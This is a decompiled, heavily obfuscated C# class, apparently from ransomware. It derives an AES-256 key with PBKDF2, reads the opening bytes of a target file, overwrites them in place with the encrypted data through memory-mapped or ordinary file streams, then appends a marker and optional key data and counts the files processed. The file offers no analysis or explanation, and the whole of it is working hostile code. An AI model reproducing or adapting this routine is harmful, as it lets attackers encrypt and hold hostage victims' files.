using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace WEoqBCtavg;

public static class rwdywKWjrsgNr
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] oduSqTZFmKEZeE(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = HfBstacqmtrNMP(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes HfBstacqmtrNMP(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] QjeyEurzjAWm(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (TwRTxDxfshC.rHhBmCCZMcQgOTEFl == getString_0(107397047))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (TwRTxDxfshC.OcJOCuetrNWE)
			{
				try
				{
					File.AppendAllText(TwRTxDxfshC.eWxeBKmemNzo, getString_0(107355014) + string_0 + getString_0(107365828) + ex.Message + getString_0(107397113));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool fnLbcECBFZo(string uMnpDDfWEjOj, byte[] isJBuYzWrlQz, byte[] jLGNDNsQQAf = null)
	{
		try
		{
			byte[] array = null;
			if (TwRTxDxfshC.rHhBmCCZMcQgOTEFl == getString_0(107397047))
			{
				array = (TwRTxDxfshC.QBycHWRjvZdj ? Encoding.ASCII.GetBytes(TwRTxDxfshC.czGbdVLSgBt(TwRTxDxfshC.iYZblQzYxzlCljO) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365290)) + Convert.ToString(TwRTxDxfshC.kwKjQmALwKqSJ) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365290))) : Encoding.ASCII.GetBytes(TwRTxDxfshC.czGbdVLSgBt(TwRTxDxfshC.iYZblQzYxzlCljO) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365299)) + Convert.ToString(TwRTxDxfshC.kwKjQmALwKqSJ) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365299))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(uMnpDDfWEjOj, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(isJBuYzWrlQz, 0, isJBuYzWrlQz.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(uMnpDDfWEjOj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!TwRTxDxfshC.QBycHWRjvZdj)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(jLGNDNsQQAf, 0, jLGNDNsQQAf.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (TwRTxDxfshC.QBycHWRjvZdj ? Encoding.ASCII.GetBytes(TwRTxDxfshC.czGbdVLSgBt(TwRTxDxfshC.iYZblQzYxzlCljO) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365290)) + Convert.ToString(TwRTxDxfshC.kwKjQmALwKqSJ) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365290))) : Encoding.ASCII.GetBytes(TwRTxDxfshC.czGbdVLSgBt(TwRTxDxfshC.iYZblQzYxzlCljO) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365299)) + Convert.ToString(TwRTxDxfshC.kwKjQmALwKqSJ) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365299))));
				FileStream fileStream2 = new FileStream(uMnpDDfWEjOj, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(isJBuYzWrlQz, 0, isJBuYzWrlQz.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(uMnpDDfWEjOj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!TwRTxDxfshC.QBycHWRjvZdj)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(jLGNDNsQQAf, 0, jLGNDNsQQAf.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			TwRTxDxfshC.CdwAzIsawvqKS++;
		}
		catch (Exception ex)
		{
			if (TwRTxDxfshC.OcJOCuetrNWE)
			{
				try
				{
					File.AppendAllText(TwRTxDxfshC.eWxeBKmemNzo, getString_0(107355014) + uMnpDDfWEjOj + getString_0(107365249) + ex.Message + getString_0(107397113));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (TwRTxDxfshC.QBycHWRjvZdj ? Encoding.ASCII.GetBytes(TwRTxDxfshC.czGbdVLSgBt(TwRTxDxfshC.iYZblQzYxzlCljO) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365290)) + Convert.ToString(TwRTxDxfshC.kwKjQmALwKqSJ) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365290))) : Encoding.ASCII.GetBytes(TwRTxDxfshC.czGbdVLSgBt(TwRTxDxfshC.iYZblQzYxzlCljO) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365299)) + Convert.ToString(TwRTxDxfshC.kwKjQmALwKqSJ) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365299))));
				FileStream fileStream4 = new FileStream(uMnpDDfWEjOj, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(isJBuYzWrlQz, 0, isJBuYzWrlQz.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(uMnpDDfWEjOj, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!TwRTxDxfshC.QBycHWRjvZdj)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(jLGNDNsQQAf, 0, jLGNDNsQQAf.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static rwdywKWjrsgNr()
	{
		Strings.CreateGetStringDelegate(typeof(rwdywKWjrsgNr));
	}
}
